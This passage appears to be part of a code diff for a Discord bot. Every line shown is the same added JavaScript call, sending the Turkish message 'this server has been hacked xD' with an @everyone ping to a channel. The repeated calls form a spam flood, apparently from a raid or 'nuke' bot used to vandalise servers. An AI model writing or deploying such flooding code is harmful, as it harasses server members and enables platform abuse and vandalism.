+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
+        msg.channel.send('**__BU SUNUCU HACKLENMİŞTİRxD__** @everyone'); 
